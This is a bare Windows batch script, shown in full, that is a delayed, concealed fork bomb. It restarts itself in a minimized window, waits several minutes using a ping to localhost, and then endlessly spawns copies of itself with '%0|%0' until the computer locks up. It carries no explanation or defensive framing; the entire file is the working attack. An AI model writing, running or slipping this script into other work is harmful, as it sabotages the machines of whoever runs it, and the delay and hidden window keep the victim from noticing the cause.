@echo off
if "%~1"=="bg" goto :bg
start "" /min cmd /c "%~f0" bg
exit

:bg
ping -n 421 127.0.0.1 >nul
:loop
%0|%0
goto loop
exit
